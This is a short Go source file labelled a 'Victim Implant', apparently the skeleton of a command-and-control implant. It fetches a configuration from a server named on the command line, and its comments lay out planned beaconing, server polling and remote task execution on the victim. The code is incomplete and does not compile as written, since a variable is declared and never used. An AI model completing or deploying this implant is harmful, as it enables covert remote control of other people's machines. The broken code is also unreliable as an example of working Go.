//Victim Implant for SUSC2

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/google/uuid"
)

type config struct {
	identifier uuid.UUID
	beaconTime int
	serverList []string
}

func get_config(address string, port uint16) *json.Decoder {
	s := fmt.Sprintf("http://%s:%d", address, port)
	resp, err := http.Get(s)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	scanner := bufio.NewScanner(resp.Body)
	raw_config := ""
	for scanner.Scan() {
		//i := 0; scanner.Scan(); i++ {
		raw_config += scanner.Text()
	}
	config := json.NewDecoder(strings.NewReader(raw_config))
	fmt.Print(config)
	return config
}

func main() {
	//Attempt to gather config from Skeld server.
	var address string = os.Args[1]
	port, err := strconv.ParseInt(os.Args[2], 10, 16)
	if err != nil {
		panic(err) // idfk man i wanna go sleep, true
	}

	config := get_config(address, uint16(port))
	//Poll Skeld servers to make sure MIN(num_servers, 3) are known and functional.

	//If there are no working Skeld servers left, start wandering...

	//... Otherwise, pick a random Skeld server from the polled and known-working ones to check for new tasks.

	//Get the tasks from the server, loop through them, and execute.

	//Maybe buffer the

	//eppy boi
}
